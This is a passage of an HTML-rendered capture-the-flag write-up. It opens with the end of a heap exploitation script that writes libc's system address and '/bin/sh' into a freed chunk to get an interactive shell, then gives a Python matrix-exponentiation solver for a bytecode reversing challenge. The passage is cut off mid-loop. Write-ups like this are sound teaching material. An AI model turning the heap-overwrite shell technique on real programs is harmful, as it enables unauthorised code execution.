<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">edit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-function)">p64</span><span style="color:var(--astro-code-token-punctuation)">(libc.symbols.system))</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">libc.symbols.system = </span><span style="color:var(--astro-code-token-keyword)">:#x</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">edit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-string-expression)">"/bin/sh"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">free</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">interactive</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{j33z_1_d1dn7_kn0w_h34p_1z_s0_easy}</span></span>
<span class="line"></span></code></pre>
<h2 id="revcatch-me-if-you-can">rev/catch-me-if-you-can</h2>
<p>Read the Python bytecode file using <code>dis.dis</code>, comparing the disassembled code with that of a simple try-catch-finally loop. Optimize the calculation using matrix multiplication and fishy optimizations.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> os</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">setrecursionlimit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">2000000</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var5 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> os</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">urandom</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var6 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"You're Lucky"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"Here is your flag: "</span><span style="color:var(--astro-code-token-punctuation)">, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var12 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> [</span><span style="color:var(--astro-code-token-constant)">96</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 98</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 68</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 160</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 172</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 115</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 108</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 25</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 122</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 208</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 71</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 158</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 63</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 233</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 59</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 180</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 165</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 115</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 203</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 177</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 17</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 166</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 196</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 255</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 127</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 70</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 172</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 55</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 11</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 204</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 198</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 31</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 60</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 167</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 17</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 132</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 106</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 195</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 19</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 38</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 151</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 203</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 163</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 211</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 27</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 73</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 98</span><span style="color:var(--astro-code-color-text)">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> numpy </span><span style="color:var(--astro-code-token-keyword)">as</span><span style="color:var(--astro-code-color-text)"> np</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MOD </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1000000007</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">15</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-keyword)"> and</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 5</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">M</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> n</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">eye</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">, dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-token-punctuation)">(np.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, M) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)"> MOD, n </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    return</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, </span><span style="color:var(--astro-code-token-function)">matpow</span><span style="color:var(--astro-code-token-punctuation)">(M, n </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">))</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">])</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">eye</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">, dtype</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">int</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">LMOD </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (MOD </span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)"> 9</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> var14 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> var14 </span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-token-constant)"> 25</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        var6 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> **</span><span style="color:var(--astro-code-color-text)"> var14</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        pcom</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> prem </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> var6 </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 15</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var6 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        ttl </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (</span><span style="color:var(--astro-code-token-constant)">15</span><span style="color:var(--astro-code-token-keyword)"> *</span><span style="color:var(--astro-code-color-text)"> pcom </span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-color-text)"> prem) </span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)"> 3</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        pcom </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (ttl </span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)"> 15</span><span style="color:var(--astro-code-color-text)">) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)"> LMOD</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        prem </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> ttl </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 15</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> matpow</span><span style="color:var(--astro-code-token-punctuation)">(MF, pcom)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(prem):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-keyword)"> and</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 5</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
